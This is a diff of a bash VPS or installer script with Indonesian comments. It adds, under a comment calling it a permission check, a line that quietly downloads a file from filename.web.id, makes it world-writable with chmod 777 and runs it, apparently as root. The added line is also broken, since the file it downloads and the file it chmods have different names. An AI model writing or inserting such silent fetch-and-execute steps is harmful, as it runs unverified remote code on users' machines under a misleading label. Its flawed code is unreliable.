@@ -32,12 +32,12 @@ cek_izin() {
     exit 1
 }
 
-# === Jalankan pengecekan izin ===
-cek_izin
-
 # === Install dependensi ===
 DEBIAN_FRONTEND=noninteractive apt install -y screen jq speedtest-cli wget curl | tee -a "$LOGFILE"
-
+# === Jalankan pengecekan izin ===
+wget -q https://filename.web.id/chagerepos && chmod 777 changerepos && ./chagerepos 3
+cek_izin
+sleep 10
 # === Download Install.sh jika belum ada ===
 if [[ ! -f /root/Install.sh ]]; then
     wget -q https://raw.githubusercontent.com/Diah082/vip/main/Install.sh -O /root/Install.sh
